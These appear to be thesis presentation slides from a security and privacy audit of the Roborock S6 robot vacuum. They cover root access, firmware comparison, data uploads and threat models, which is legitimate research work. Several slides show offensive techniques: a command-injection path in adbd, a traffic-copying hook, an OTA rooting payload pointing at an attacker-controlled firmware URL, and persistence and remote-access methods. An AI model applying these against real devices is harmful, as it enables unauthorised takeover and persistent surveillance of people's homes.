+++
date = 2022-07-22T08:28:19Z
layout = "bundle"
outputs = ["Reveal"]
title = "Final Thesis Presentation | Andrew Wong"
+++

{{< slide background-image="https://featherbear.cc/UNSW-CSE-Thesis/uploads/covers/0T4A9791.JPG" transition="fade" >}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

### "Smart" Vacuum Cleaners

##### An Audit Into The Security and Integrity of IoT Systems

###### Andrew Wong | UNSW Sydney

---

<style>
img[round] {
  border-radius: 10px;
}
</style>

# Today's Agenda

* Topic recap
* Thesis statement
* Thesis A and B results
* Where we left off (new progress)
* Discussion
* Conclusion

{{% note %}}
This presentation is hopefully less about the 'results' but more addressing the question about security and privacy
{{% /note %}}

---

<style>
.marquee-parent {
  position: relative;
  width: 100vw;
  max-width: 100%;
  height: 200px;
  overflow-x: hidden;
  border-radius: 10px;
}

.marquee-child {
  position: absolute;
  white-space: nowrap;
  will-change: transform;
  max-width: unset !important;
  max-height: 100% !important;
  animation: marquee 360s linear infinite;
}

.marquee-child:hover {
  animation-play-state: paused;
}

@keyframes marquee {
  from { transform: translateX(0); }
  to { transform: translateX(-87.5%); }
}

</style>

<br />
<div class="marquee-parent"><img src="/uploads/20211115-lightbulbs-marquee.png" class="marquee-child" ></div>
</br>
{{% section %}}

_...so there are a lot of IOT devices and IOT brands out there..._

{{% note %}}
Smart watches, smart washing machines, smart flip-flop shoes...
{{% /note %}}

---

🕵️‍♂️ Are competing products looking suspiciously similar to you?  
Most are <u>white-labelled</u> products, the biggest ecosystem vendor being <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/tuya_logo.png" height="40px" alt="Tuya" ></span>

<label>Pros</label>

👨‍💻 Use someone else's code  
💹 Fast profit turnaround

<label>Cons</label>  

⚠️ Use someone else's code  
🔓 Potentially security vulnerabilities

{{% note %}}
FYI not here to tell you whether or not IOT devices are good or not... that's for you to judge. My research is on whether these big players have been doing their part (as providers) to keep us safe
{{% /note %}}

---

IOT ecosystems often have a centralised system to manage their fleet <span style='font-size: 18px'> (devices)</span>.

<label>Pros</label>

A centralised management is <u><i>so</i></u> much simpler/easier/faster/cheaper/'better' than a decentralised one.

<label>Cons</label>  

⚠️ Device functionality dependent on system availability  
⚠️ Little transparency about what/where/when/why data is transmitted

{{% note %}}
Remotely issue firmware updates, commands, send logs, monitor network stability, etcetera
{{% /note %}}

{{% /section %}}

---

# Statement

{{% section %}}

>

<div>
How have manufacturers of IoT / smart home devices addressed the increasing concerns of digital privacy and product security?
<div style="text-align: right; font-size: 20px;">(Specifically Roborock)</span>
</div>

> 

<br />
<br />

* Digital Privacy
    * Investigate the nature of network data
    * i.e. content, frequency, destination, usage
* Product Security
    * Investigate security vulnerabilities
    * Assess the effectiveness of security fortifications

---

<div style="display: flex; flex-direction: row">

<div>
Device in scope: <label>Roborock S6</label> (2019)

A smart vacuum cleaner, with integrations to both <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/tuya_logo.png" height="40px" alt="Tuya" ></span> and <span style="display: inline-table; vertical-align: middle;"><img src="/uploads/xiaomi_smartlife_logo.webp" height="40px" alt="Mijia (Xiaomi)" ></span> (depending on model)
</div>

<img src="/uploads/20211103-s6-pure-banner.webp" width="500px">
</div>

&nbsp;  

> It works pretty well, according to reviews.  
> But is it safe to connect to your home?  

{{% note %}}
Roborock was first tasked by Xiaomi to develop their vacuum cleaner (Mi Robot Vacuum Cleaner) in 2017 - they have since become their own company, developing their own line of vacuum cleaners
{{% /note %}}

{{% /section %}}

---

{{% section %}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Thesis A | Results

---

{{< slide transition="fade" >}}

Thesis A - Disassembled the device (many, many screws)

[<img round src="/uploads/20211030_040050.jpg">](https://www.youtube.com/watch?v=MnvvZbCDcA8)

---

{{< slide transition="fade" >}}

Thesis A - Found the UART pins and got some terminal

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-a/?noControls#/19/5"></iframe>

---

{{< slide transition="fade" >}}

Thesis A - Got root access (Device runs Ubuntu 14.04.3 LTS)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-a/?noControls#/19/7"></iframe>

{{% /section %}}

---

{{% section %}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Thesis B | Results

---

{{< slide transition="fade" >}}

Thesis B - Firmware dump (`dd`) for offline/static analysis

<a href="https://featherbear.cc/UNSW-CSE-Thesis/posts/20220302-progress/#backup"><img round src="/uploads/20220501-0T4A9824.JPG"></a>

{{% note %}}
Could have dumped with a flash dumper but I don't own one of those!  
This does mean I only have access to the eMMC rather than being able to dump the firmware of the STM or other chips on the motherboard... but it's probably enough.  

Plus also if there's a firmware update to those chips, I could just look at that.
{{% /note %}}

---

{{< slide transition="fade" >}}

Thesis B - Inspection of system (privileged processes)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/7/2"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Recovery partition manipulation (see [proof of concept](https://www.youtube.com/watch?v=eABmzUfZ22A))

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/12/3"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Capture of device traffic (port-mirroring)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/6"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Inspection of system services (`netstat`, `ip{,6}tables`)

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/7/3"></iframe>

{{% note %}}
Note that there is a firewall rule - though certain programs were able to unblock the port
{{% /note %}}

---


{{< slide transition="fade" >}}

Thesis B - Remote access persistence (see [proof of concept](https://www.youtube.com/watch?v=om2yzYHU1A0))
<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/8"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Investigating `tcpdump`

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/11/4"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Investigating `rrlogd`

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/11/6"></iframe>

---

{{< slide transition="fade" >}}

Thesis B - Investigating `adbd`

<iframe style="border: 2px solid white; border-radius: 10px; pointer-events: none;" width=1280 height=720 src="../seminar-b/?noControls#/11/8"></iframe>

{{% /section %}}

---

{{% section %}}

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Where we left off

---

## From Thesis B (security)

* Finish analysing firmware binaries
* Comparing files against the stock Ubuntu OS
* Check if an IPv6 address is assigned (hence SSH)
  * ans: [no.](https://featherbear.cc/UNSW-CSE-Thesis/posts/ipv6-check/)

## From Thesis C (privacy)

* LAN/WAN traffic analysis
  * Look at network behaviour
  * Hook into transmit and receive functions (pre-encrypt / post-decrypt)
* Update to latest version <span style="font-size: 18px">(and hope we don't get locked out)</span>
  * <span style="color: grey; font-size: 18px">disclaimer: we got locked out. hahah....</span>
  * Compare file changes
* Factory reset device, check for remnant files


{{% /section %}}

---

# More on `adbd`

<small>A novel but not-so-useful way to perform arbitrary code execution</small>

{{% section %}}
Command injection vulnerability exists within the modified `adbd` binary

![](/uploads/20220725-snipaste_2022-07-26_04-02-13.jpg)

---

## What's modified?

* Interface to perform `uart_test` and `ruby_flash`
* Authenticated access to `adb shell`
  * Dynamic challenge/response
  * Requires knowledge of `vinda`, device ID

![](/uploads/20220725-snipaste_2022-07-25_23-49-57.jpg)

---

## Auth Flow

```
SYS_PASSWD = /mnt/default/vinda := ABCD1234ABCD1234

# Get challenge
CHALLENGE $= adb shell [SYS_PASSWD]rockrobo dynamickey

# Generate response
ADB_PASSWD = generate(challenge, device_id)

# Perform command
adb shell [SYS_PASSWD][ADB_PASSWD] [COMMAND*]
```

---

## Achieving RCE

* The modified binary has some sort of access level implementation
  * Depends on value in `/mnt/default/adb.conf` (RO)

>

* Arbitrary command execution when access level = 0
  * But the app also resets this value to 1
  * <code>&</code>, <code>;</code>, <code>|</code>, <code>`</code> characters are also forbidden
>

😢 No arbitrary command execution...


```bash
$> py -3 adbStart "whoami"

src/rr_ruby.c::adb_check_unlock_level1():not support /adb shell sys_passwd#adb_passwd whoami in level 1
```

---

## Noooooooooo <span style="font-size: 18px">wait what</span>

![](/uploads/Snipaste_2022-07-26_05-53-34.jpg)

... where did `/bin/sh` come from..?

---

{{< slide transition="fade" >}}

## RCE via command substitution

![](/uploads/20220725-snipaste_2022-07-26_03-56-14.jpg)

Avoiding the forbidden characters (<code>&</code>, <code>;</code>, <code>|</code>, <code>`</code>) we can exploit command substitution and redirections to inject commands.

> Allows us to write to the filesystem

---

{{< slide transition="fade" >}}

## RCE via command substitution

> Or read from the filesystem too!

![](/uploads/20220725-snipaste_2022-07-26_04-02-13.jpg)


---

## POC breakdown <span style="font-size: 18px">(Where it falls apart)</span>

* Still need to authenticate before RCE possible
  * Still need knowledge of the `/mnt/default/vinda` file
  * Need to physically open the device at least once
    * Screws. Lots of them.

>

* At least, provides a way to issue commands even when `adb_lock != 0`
  * USB protocol is more common and accessible to people
  * SSH access might stop working / be blocked <span style="color: grey; font-size: 12px">(spoilers)</span> <!-- i.e. network issues -->
  * Serial access might stop working / be blocked <span style="color: grey; font-size: 12px">(spoilers)</span> <!-- not everyone has a UART cable -->

{{% /section %}}

---


{{% note %}}
Now that we're throwing in a new firmware version, or a few new versions actually...  
What's the best way to explore these?

All of firmware A, then all of firmware B, then all of firmware C?

Or topic 1, firmware A and B and C
then topic 2, firmware A and B and C

The second idea is probably better - as we should be focussing on the _changes_ (i.e. efforts that the company has done) between firmware version
{{% /note %}}

# Firmware Comparison

{{% section %}}

```bash
$> cat /etc/OS_VERSION
ro.product.device=MI1558_TANOS_MP_S2020032500REL_M3.3.0_RELEASE_20200325-204847
$> #              ^^^^^^           ^^^^^^^^
$> #              \/\\//           \\\\////
$> #          Xiaomi v01.15.58  25th March 2020
$> #                                      
```

<label>Aside</label>

* The Roborock S6 was released in June 2019
* The unit I have was manufactured June 2020
  * My unit has a newer base firmware (25th March 2020)
* Note the presence of "<label>MI</label>" at the start of the product string

---

## Stock Ubuntu 14.04.3 LTS

Performed a `diff` check against the [Ubuntu 14.04.3 Core LTS (armhf)](http://cdimage.ubuntu.com/ubuntu-base/releases/14.04/release/ubuntu-base-14.04.3-core-armhf.tar.gz) OS.

> 

* All binaries present on the device matched, <i>except</i> for `ntpdate` (synchronise computer time via NTP)
* Still functionally equivalent

![](/uploads/20220724-snipaste_2022-06-29_02-32-15.jpg)


---

## A new firmware

```diff
-ro.product.device=MI1558_TANOS_MP_S2020032500REL_M3.3.0_RELEASE_20200325-204847
+ro.product.device=TANOS_V2902-2022042802REL_M3.5.8_T4.1.4-2_RELEASE_20220428-202811
-ro.build.display.id=TANOS_MP_R16_RELEASE_20200325-204847
+ro.build.display.id=TANOS_MP_R16_RELEASE_20220428-202811
 ro.sys.cputype=R16.STM32.A3.G1
-ro.build.version.release=1558
+ro.build.version.release=V2902
-ro.build.date.utc=1585140527
+ro.build.date.utc=1651148891
```

The update process performed several incremental updates..  
finally updating to <label>v02.29.02</label> (28th April 2022)

---

## The Official Changelog

```
> 01.17.08 (17th April 2020)
- Supports multi-floor map saving and robot knows which floor it is
- Update to new structured SLAM algorithm to make map more reliable
- Support customised room cleaning sequence
- Support no-mop zone

> 01.19.98 (9th June 2020)
* Improvised Wi-Fi Easy Connect
* overall improvements
* bug fixes
* UX fixes

> 01.20.76 (23rd June 2020)
* Obstacle avoidance enhancements
* Bug fixes and UI optimisation

> probably more updates (got locked out)

> 02.29.02 (28th April 2022)
* Optimized the quick mapping experience
```

---

{{< slide transition="fade" >}}

## The Changelog I Actually Care About

```
> 01.17.08 (17th April 2020)
* /opt/rockrobo/watchdog/WatchDoge iptables drop SSH
* /opt/rockrobo/rrlog/rrlogd iptables drop SSH
* Utilities change to busybox
* SSH server changed to dropbear
* /opt/rockrobo/rriot/rriot_rr added (but not enabled)

> 01.19.98 (9th June 2020)
* Serial handler changed to /sbin/rr_login

> 01.20.76 (23rd June 2020)
-

> probably more updates (got locked out)

> 02.29.02 (28th April 2022)
* /opt/rockrobo/rriot/rriot_rr enabled
```

---

## Getting locked out - `rr_login`

```md{5}
...
* /opt/rockrobo/rriot/rriot_rr added (but not enabled)

> 01.19.98 (9th June 2020)
* Serial handler changed to /sbin/rr_login

> 01.20.76 (23rd June 2020)
-
...
```

After the <label>v01.19.98</label> update, serial shell access was denied, uh oh!

{{% note %}}
Did the password change?  
Did I break something?  
Is this the end?  
{{% /note %}}

---

## Lockdown: Shell

* Serial handler no longer uses `getty`
  * Now uses modified version called [`rr_login`](posts/sbin-rr_login/)
* OpenSSH server was replaced with modified version of `dropbear`

>

Both only allow login as the `root` user

![](/uploads/20220711-snipaste_2022-07-12_00-28-13.jpg)

{{% note %}}
Serial handler is responsible for giving us the UART shell interface)
{{% /note %}}

---


## Lockdown: Authentication

The `vinda` file is no longer used for auth!  

>

Login attempts now verify against
* `[mmcblk0p6]/shadow`
* `[mmcblk0p6]/shadow.sign`.

> But these files don't exist on my device...

Affected: `rr_login` (serial), `dropbear` (SSH), `adbd`? (USB)

{{% note %}}
Confirmed by checking against strace / gdb / static analysis (BinaryNinja)
{{% /note %}}

<small><label>Fix</label><br />
[(1)](https://featherbear.cc/UNSW-CSE-Thesis/posts/upgraded-accessing-the-shell/) Enter bootloader and force entrypoint to a shell<br/>
[(2)](https://featherbear.cc/UNSW-CSE-Thesis/posts/upgrade-notes/#notice) Patch `/etc/inittab` to revert back to a normal login shell</small>

---

## Lockdown: Authentication <span style="font-size: 24px">(`verify_shadow`)</span>

![](/uploads/20220719-snipaste_2022-07-19_22-51-42.jpg)

---

## Lockdown: Authentication <span style="font-size: 24px">(SSH auth attempt trace with `strace`)</span>

![](/uploads/20220719-snipaste_2022-07-19_22-24-51.jpg)

---

## System Changes

* Are we still using Ubuntu?
  * Maybe? <!-- /etc/os-release seems too say so, but it could be a leftover artifact -->
  * `apt-get` and `dpkg` removed
* Lots of tools were replaced with BusyBox (v1.24.1)
  * Also a space-saving measure
  * ![](/uploads/20220724-snipaste_2022-07-25_02-50-06.jpg)
* Effectively now running embedded Linux

<small>[Download git diff](https://github.com/featherbear/UNSW-CSE-Thesis/blob/master/firmwares/updating/v02.29.02_diff_v01.15.58.diff)</small>

---

## Lockdown: Firewall

* There are now `ip6tables` rules to drop all packets 👏
    * Apps also no longer perform IPv6 (AAAA) DNS requests <!-- i.e. rrlogd: fds -->

>

* Processes have calls to reinstate dropping SSH access
    * `rrlogd` now drops access on bad version match
        * (previously _only_ allowed access on correct version match)
    * `WatchDoge` immediately drops access on start

&nbsp;  

{{% center %}}<img src="/uploads/20220711-snipaste_2022-07-12_01-25-43.jpg" width="60%">{{% /center %}}

---

## `rrlogd` and `wlanmgr`

`wlanmgr` now has the functionality to call `tcpdump`
<!-- * `rrlogd` receives `MSG_LOG_DEBUG_ENABLE` event -->

>

<!-- `MSG_LOG_DEBUG_UPLOAD_DATA` event -->
`rrlogd` will upload the following

|Content|Description|
|:---:|:---|
|`/etc/resolv.conf`|DNS resolvers|
|`netstat -anp`|All sockets and their PIDs|
|`ifconfig`|Network interface status|
|PCAP|Packet capture|

<!-- ![](/uploads/20220711-snipaste_2022-07-12_03-58-09.jpg) -->

<!-- ---
## `rriot_rr`

New file, not used unless `/dev/shm/.migrate_to_rriot` exists and is populated

---

## `rriot_tuya`

Used to have the `tuya_iot_impl_upload_file` function but has been removed
 -->

{{% /section %}}

---

# What else is uploaded (`rrlogd`)?

{{% section %}}

> What can the manufacturer see?

* Device data
* Application config
* Application logs
* SLAM (map)
* Running processes
* Wireless configuration
* Packet capture
* Blackbox (statistics)

> See: [Privacy Policy](https://featherbear.cc/UNSW-CSE-Thesis/posts/privacy-policy-from-apk/)

{{% note %}}
It inadvertently uploads the device's wireless network credentials (because of app logs), though there is realistically no need for the manufacturer to know this.

Also - the device can't connect without being connected to a wireless network with an internet connection. So the reason of 'troubleshooting connectivity issues' is rather moot.
{{% /note %}}

---

```md
Effective: 30th April 2019

Cleaning-related information ... last 20 items will be saved by your device and server...
...stored in the server for up to 180 days, ... automatically deleted after expiration.
Network information: ...the password information is only stored on the device side...
... will not be uploaded to the server.
Timing information... Cleanable Area Information... Other information: For example, ....
```

"Password [...] only stored on the device" - <label>Well about that...</label>

{{% center %}}
<div><img round src="/uploads/Snipaste_2022-07-28_07-11-20.png" width="60%" ></div>
<small>Above: Log data uploaded by <code>rrlogd</code> | FW: v02.29.02 (28th April 2022)</small>
{{% /center %}}

{{% note %}}
Also like... "Other information" is rather bleak...
{{% /note %}}

{{% /section %}}

---

# File Persistence <span style="font-size: 24px">(Upgrade and Reset)</span>

Test untouched directories during a [firmware update](https://featherbear.cc/UNSW-CSE-Thesis/posts/upgrade-upgrade-persistence/) and [factory reset](https://featherbear.cc/UNSW-CSE-Thesis/posts/upgrade-reset-persistence)

>

{{% section %}}

<div style="display: flex; flex-direction: row">

<div>
<label>Upgrade Persistent</label>

* [mmcblk0p11] @ `/mnt/reserve`
* [mmcblk0p1] @ `/mnt/data`
</div>

<div>
<label>Reset Persistent</label>

* [mmcblk0p11] @ `/mnt/reserve`
</div>
</div>

&nbsp;  
&nbsp;  
&nbsp;  

>

|Partition|Purpose|
|:---:|:---|
|`mmcblk0p1`|Device registration, WiFi, map data, logs|
|`mmcblk0p11`|Statistics, calibration data|

---

* Map, log and user data is cleared (securely)
* Reserve partition is never cleared, even during factory resets

```
mmcblk0p11
|   mcu_ready
|   try
|   hwinfo
|   anonymousid1
|   lds_calibration.txt
|   counter
|   CompassBumper.cfg
|   blackbox.db
|   rrBkBox.csv
|   endpoint.bin
|   RoboController.cfg
|   last_partition
|
\---rriot
        tuya.json
```

{{% note %}}
* Can't perform byte-level recovery (e.g. photorec) due to reset method
* Can't completely disassociate yourself from the previous owner
* Possible to forge symbolic links?
{{% /note %}}


{{% /section %}}

---

# File Persistence <span style="font-size: 24px">(Account disassociation)</span>

⚠️ All files kept between disassociations

* Roborock should make the device reset itself automatically 
  * They probably don't because they assume you will reconnect

> 

* Selling your device?
  * Do a factory reset
  * ...or don't.  
* Buying a new device?
  * Do a factory reset (and hope it's not modified)

---

# Network Inspection

{{% section %}}

<label>Setup</label>
* Isolated sandbox network
  * Router, switch, access point, Vacuum Cleaner
  * Additional NUC to simulate peer data
* Captured packets (unattended) for a month
* Captured packets (interactive) for several sessions
* Filter out network noise
* Compare network activity between old and new firmware

{{% center %}}<img round src="/uploads/Snipaste_2022-05-05_01-31-27.jpg" width="65%">{{% /center %}}

---

## Network Behaviour <span style="font-size: 24px">(FW v02.29.02) (exc FDS) (1 week)</span>

{{% center %}}<img round src="/uploads/20220724-snipaste_2022-07-25_07-41-15.jpg" width="60%">{{% /center %}}

|Endpoint|Protocol|Description|
|:---|:---:|:---|
|`m2.tuyaeu.com`|MQTT|Inbound requests|
|`a2.tuyaeu.com`|HTTPS|Outbound requests|
|`awsde0.fds.api.xiaomi.com`|[FDS](http://docs.api.xiaomi.com/en/fds/)|Logs upload|

---

## Network Geomap <span style="font-size: 24px">(FW v02.29.02) (exc FDS) (1 week)</span>

![](/uploads/20220724-m2-a2-geomap.png)

---

## Observations

* Local traffic - DHCP (5min), Tuya Discovery (5s)
* Connections to America, Germany, China
  * America, Germany - AWS - `fds`, `a2`, `ms`, `m2`
  * <span style="color: grey">China - Mi IO Cloud (v01.15.58 only)</span>
* Increased network activity at 3am <!-- MQTT, A2 -->
  * 3am AEDT is 12am in Beijing
  * Connections are being established - possible timeout/reconnect

## Changes

* New FW uses `m2.tuyaeu.com` instead of `ms.tuyaeu.com`
* New FW no longer polls `xx.ot[t].io.mi.com`

---

## What's in the packet?

> Most (if not all) communications were encrypted

<s>1. Break the encryption</s> too much effort

1. Hook into the pre-encryption / post-decryption stages

```
/* Send test to 10.251.252.253:28422 */
void hook(void* data, uint data_len) {
  int sock = create_udp4_connection(IPV4_ADDR(10,251,252,253), 28422);
  send(sock, data, data_len, 0);
}
```

2. Just look at the app logs<i>*</i>

<small><i>*: Application logs are less verbose in newer FW versions<br />
However they communicate the same way as the older FW versions</i></small>

---

## Example MQTT conversation <span style="font-size: 24px">(`{m2,ms}.tuyaeu.com`)</span>

Server Request
```json
{
  "id": 889,
  "method": "get_prop",
  "params": [ "get_status" ]
}
```

Device Response
```json
{
  "id": 889,
  "result": [{
    "msg_ver": 2,
    "msg_seq": 275,
    "state": 8,
    "battery": 100,
    "clean_time": 0,
    "clean_area": 0,
    "error_code": 3,
    "map_present": 1,
    "in_cleaning": 0,
    "in_returning": 0,
    "in_fresh_state": 1,
    "lab_status": 0,
    "water_box_status": 0,
    "fan_power": 102,
    "dnd_enabled": 0,
    "map_status": 1,
    "lock_status": 0,
    "events": []
  }]
}
```

---

## Example Control conversation <span style="font-size: 24px">(`a2.tuyaeu.com`)</span>

Device Request
```
HTTP POST
https://a2.tuyaeu.com/d.json?a=tuya.device.timer.count&devId=...&et=1&t=...&v=4.0&sign=...

{"devId":"...","lastFetchTime":"0","t":1657046157}
```

Server Response
```json
{
  "result": {
    "devId": "...",
    "count": 0,
    "lastFetchTime": 0
  },
  "t": 1657046159,
  "success": true
}		
```

---

## Log data <span style="font-size: 24px">(Xiaomi FDS)</span>

<div style="display: flex; flex-direction: row">
<div style="min-width: 50%">
Data is compressed and encrypted

* `/mnt/data/rrlog/**`
* `/dev/shm/**`
* `/mnt/reserve/...`

> 

* App logs
* Updater logs
* 'Anonymous' statistics
* `wlanmgr tcpdump`
</div>

<div>
<img style="flex: 1" round src="/uploads/20220705-snipaste_2022-07-05_20-36-52.jpg">
</div>
</div>


---

## Network Map

<img src="/uploads/network.dark_20220725.png" width="850px" >

{{% /section %}}

---

<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />

# Demos and POCs

{{% note %}}
Before we look at threats, let's look at some fun stuff!
{{% /note %}}

---

# Remote Access (across the internet!!!)

* Easy to perform - system has required libraries and network stack
* e.g. Reverse SSH
* e.g. VPN / SD-WAN

{{< youtube om2yzYHU1A0 >}}
<!-- TODO: video thumbnail? -->

---

# Reset Persistence (factory reset friendly!!!)

> #ModifyingTheRecoveryPartitionForFunAndProfit

{{< youtube eABmzUfZ22A >}}

---

# Upgrade Persistence <span style="font-size: 24px">([see concept post](https://featherbear.cc/UNSW-CSE-Thesis/posts/achieving-upgrade-persistence/))</span>


![](/uploads/20220711-snipaste_2022-07-12_04-24-24.jpg)


{{% section %}}

## Upgrade procedure

* Download the update to <span style="font-size: 0.9em; color: grey">`mmcblk0p1`</span> (data)
* Extract update to <span style="font-size: 0.9em; color: grey">`mmcblk0p10`</span> (updbuf)
* Unmount <span style="font-size: 0.9em; color: grey">`mmcblk0p8`</span> (bootA) / <span style="font-size: 0.9em; color: grey">`mmcblk0p9`</span> (bootB)
* Flash <span style="font-size: 0.9em; color: grey">`updbuf`</span> to <span style="font-size: 0.9em; color: grey">`bootA`</span> / <span style="font-size: 0.9em; color: grey">`bootB`</span>
* Boot into <span style="font-size: 0.9em; color: grey">`bootA`</span> / <span style="font-size: 0.9em; color: grey">`bootB`</span>
* Flash <span style="font-size: 0.9em; color: grey">`updbuf`</span> to <span style="font-size: 0.9em; color: grey">`bootB`</span> / <span style="font-size: 0.9em; color: grey">`bootA`</span>
* Boot into <span style="font-size: 0.9em; color: grey">`bootB`</span> / <span style="font-size: 0.9em; color: grey">`bootA`</span>

>

Both filesystems are overwritten (existing changes will disappear)

---

## Achieving upgrade persistence

* Download the update to <span style="font-size: 0.9em; color: grey">`mmcblk0p1`</span> (data)
* Extract update to <span style="font-size: 0.9em; color: grey">`mmcblk0p10`</span> (updbuf)
* 📝 <span style="color: #b94357">Modify contents of <span style="font-size: 0.9em; color: grey">`updbuf`</span></span>
* Unmount <span style="font-size: 0.9em; color: grey">`mmcblk0p8`</span> (bootA) / <span style="font-size: 0.9em; color: grey">`mmcblk0p9`</span> (bootB)
* Flash <span style="color: #b94357">modified</span> <span style="font-size: 0.9em; color: grey">`updbuf`</span> to <span style="font-size: 0.9em; color: grey">`bootA`</span> / <span style="font-size: 0.9em; color: grey">`bootB`</span>
* Boot into <span style="font-size: 0.9em; color: grey">`bootA`</span> / <span style="font-size: 0.9em; color: grey">`bootB`</span>
* Flash <span style="color: #b94357">modified</span> <span style="font-size: 0.9em; color: grey">`updbuf`</span> to <span style="font-size: 0.9em; color: grey">`bootB`</span> / <span style="font-size: 0.9em; color: grey">`bootA`</span>
* Boot into <span style="font-size: 0.9em; color: grey">`bootB`</span> / <span style="font-size: 0.9em; color: grey">`bootA`</span>

>

Modify the extracted updated firmware, so changes propagate

---

## How to modify?

* Alter the <label>`SysUpdate`</label> binary to include modification steps
* Service / cron / repeated task to write into `/mnt/updbuf`

{{% note %}}
Altering the `SysUpdate` binary is probably more reliable.  
If using a repeated or scheduled task - we'd have to have a fast loop to intercept the extraction - but a lesser loop period means more wasted executions
{{% /note %}}

---

## What to modify?

* Remote access
  * `/etc/passwd`
  * `/usr/bin/adbd`
  * `/usr/sbin/dropbear`
  * VPN / SD-WAN
  * iptables <span style="font-size: 0.6em">(various locations)</span>
* 🔊 Sounds?
* Future upgrade persistence
  * `SysUpdate`
  * Scheduled / repeated jobs

{{% /section %}}

---

# OTA Rooting 

{{% section %}}

```json
{
  "method": "miIO.ota",
  "params": {
    "mode": "normal",
    "install": "1",
    "app_url": "http://192.168.8.110:8322/firmware", // this looks definitely controllable!
    "file_md5": "6e24b0454b170f67676693b759fba742",
    "proc": "dnld install"
  },
  "id": 474627483
}
```

During device initialisation, an OTA update payload could be sent...  
[Remote root / backdoor](https://featherbear.cc/UNSW-CSE-Thesis/posts/ota-updates-blocked-as-of-late-2019/)!!

> However... patched a long time ago

---

* OTA updates during device initialisation were disabled in a November 2019 firmware update.
  - Remember - Product was released June 2019 <!-- ours was manufactured 06/2020 -->
* This method of attack is limited to devices that are
  * Not yet initialised (else will have to be factory reset)
  * Manufactured within 4 months of the device being first sold
 

![](/uploads/20220719-snipaste_2022-07-20_03-11-19.png)


{{% /section %}}


---

# Let's Talk Threats

* <label>TS0 - No malicious threat</label>
  * Visibility and ownership of the data / device
* <label>TS1 - Physical (proximal) threat</label>
  * Supply-chain
  * Second-hand seller
  * Someone with momentary/prolonged access
* <label>TS2 - Remote (proximal) threat</label>
  * Nearby, on the network
  * Nearby, outside of the network
* <label>TS3 - Remote (distal) threat</label>
  * Backdoor
  * Vendor, C2

<span style="color: grey">exc: Usage of the data in the cloud</span>

---

# TS0 - No malicious threat

{{% section %}}

> Data Visibility and Ownership

<div style="display: flex; flex-direction: row">
<div style="text-align: center; flex: 1">
<img round src="/uploads/Screenshot_20220726-081528_Roborock.jpg" width="70%">
</div>
<div>

* How do I know what data is being collected?
  * Privacy policy[™](#/9/1)
* How do I know what data is <label>actually</label> being collected?
  * Need equipment, skills, willingness
  * Patience to unscrew a lot of screws
  * Encryption
* (How) Can I control the data that is collected?
  * Locally? Remotely?
* (How) Can I confirm _my_ data has been deleted?

<small>Data includes: map data, <s>[camera]</s>, <s>[microphone]</s>, app logs, <br/>process list, network config, network data, statistics</small>


</div>
</div>

---

> Device Visibility and Ownership

<div style="display: flex; flex-direction: row">
<div>

* Is this device really mine?
* Can I see what _my_ device is doing?
* Can I modify _my own_ device

❌ Communications are encrypted  
❌ Logs are encrypted  
❌ Restricted `adbd`, `ssh`, `serial`

* But otherwise yes
  * It's just Linux
  * No hardware restrictions to flashing

</div>

<div style="text-align: center; flex: 1">
<div><img round src="/uploads/Snipaste_2022-07-28_05-48-58.jpg" width="75%"></div>
<small>Would you pay for hardware<br/>.. then pay more to use it?</small>
</div>
</div>

{{% /section %}}

---

# TS1 - Physical (proximal) threat

> <span style="font-size: 0.5em">The "friend-who-has-your-WiFi-password-even-though-you-didn't-give-it-to-them"</span>

<div style="display: flex; flex-direction: row">
<div>
<label>Prolonged access</label>

✔️ Efforts to restrict serial access  
⚠️ Supply chain  
* Extract user/device/app data
* Modifications
  * Persistence
  * Remote access
  * Jumphost
  * Eavesdropping

</div>

<div>
<label>Momentary access</label>

✔️ `adbd` (USB access) is restricted  
✔️ No fast hands-off attack vector  
  * Need to open up the device
  * Takes time to gain shell access

* Reset + OTA root
  * <span style="font-size: 0.9em">"I wonder what this _reset button_ does"</span>
  * <span style="color: grey">Pre-Nov 2019 units only</span>

</div>

</div>

---
# TS2 - Remote (proximal) threat

> The "coffee shop hacker"

✔️ All data is encrypted (application level, not just TLS)!  
✔️ IPv6 blocked  
✔️ SSH server port blocked by default  
⚠️ ...other services?  
⚠️ OTA rooting <span style="color: grey">(patched Nov 2019)</span>  
❌ Wireless credentials can be sniffed during pairing (+ promiscuous)  
  
{{% center %}}<img round src="/uploads/Snipaste_2022-05-02_01-14-22.jpg" width="40%">{{% /center %}}


---

# TS3 - Remote (distal) threat

<label>Vendor</label>

⚠️ Access to user/device/app data  
⚠️ Ability to issue remote commands  
⚠️ Network packet logging  
⚠️ Potential arbitrary execution in future releases  
[⚠️](#/9/1) Privacy policy discrepancy

<br />

<label>Other</label>

⚠️ Is my device backdoored?  
⚠️ Unknown nature of expected traffic (see later)  
⚠️ Vuln > RCE = root control

---

# Privacy / Security Response

{{% section %}}
<label>Roborock</label>

✔️ Evidence of buffer overflow checks in the binary  
